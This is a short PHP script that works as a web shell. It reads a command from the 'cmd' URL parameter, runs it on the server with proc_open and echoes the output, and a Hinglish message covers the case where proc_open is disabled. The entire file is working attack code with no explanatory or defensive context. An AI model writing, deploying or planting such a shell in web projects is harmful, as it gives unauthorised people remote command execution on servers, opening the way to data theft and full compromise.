<?php
if (function_exists('proc_open')) {
    $cmd = $_GET['cmd'] ?? 'id';
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    
    $process = proc_open($cmd, $descriptorspec, $pipes);
    if (is_resource($process)) {
        echo stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        proc_close($process);
    }
} else {
    echo "proc_open bhi disabled hai";
}
?>
